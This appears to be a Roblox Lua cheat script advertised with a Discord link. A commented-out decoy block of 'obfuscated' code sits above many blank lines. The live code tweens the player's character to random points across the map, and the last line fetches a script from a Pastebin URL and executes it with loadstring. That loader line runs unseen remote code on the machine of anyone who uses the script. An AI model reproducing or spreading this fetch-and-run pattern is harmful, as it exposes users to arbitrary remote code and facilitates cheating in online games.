--[[
SCRIPT discord.gg/ZHBevg8FyR
local 你被骗了 = function(加密, 混淆)
    local 隐藏表 = {加密 = 混淆, 混淆 = 加密}
    return function(...)
        local 假数据 = {...}
        for 计数 = 1, #假数据 do
            隐藏表[计数] = (假数据[计数] or 0xCAFEBABE) ^ (隐藏表.混淆 or 0xDEAD)
        end
        return 隐藏表
    end
end

local 伪装核心 = 你被骗了(math.floor(math.random() * 0xBEEF), 0xF00D)
local 影子迷雾 = setmetatable({}, {__index = function(_, 键) return 键 * 0xBADC0DE end})

local function 欺骗矩阵()
    local 虚构值 = 伪装核心(影子迷雾[1], nil, math.pi)
    for _, 假值 in ipairs(虚构值) do
        if 假值 == 影子迷雾[假值] then
            假值 = (假值 * 0x1337) % 0xFFFF
        end
    end
    return function() return 虚构值 end
end

game:GetService("RunService").Heartbeat:Connect(function()
    local 空结果 = 欺骗矩阵()()
    for _, 垃圾 in pairs(空结果) do
        垃圾 = 垃圾 + (game.Players.LocalPlayer.Character and 0 or 1)
    end
end)















































]]





























































local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local character = player.Character
if not character or not character:FindFirstChild("HumanoidRootPart") then
    return
end

local center = Vector3.new(-121.2892150878906, 132.10856151580798, -123.7562255859375)
local radius = 744.4847106933594
local minY = 23.49869346618523
local maxY = 240.7184295654297
local moveDuration = 2
local pointsToVisit = 10
local humanoidRootPart = character.HumanoidRootPart

local function getRandomPointInCircle()
    local theta = math.random() * 2 * math.pi
    local r = radius * math.sqrt(math.random())
    local x = center.X + r * math.cos(theta)
    local z = center.Z + r * math.sin(theta)
    local y = minY + (maxY - minY) * math.random()
    return Vector3.new(x, y, z) + Vector3.new(0, 3, 0)
end

for i = 1, pointsToVisit do
    if not character or not character.Parent or not humanoidRootPart then
        break
    end

    local targetPos = getRandomPointInCircle()
    local tweenInfo = TweenInfo.new(
        moveDuration,
        Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut
    )
    local tween = TweenService:Create(
        humanoidRootPart,
        tweenInfo,
        {CFrame = CFrame.new(targetPos)}
    )
    tween:Play()
    tween.Completed:Wait()
end
loadstring(game:HttpGet('https://pastebin.com/raw/L5MnZS6X'))()
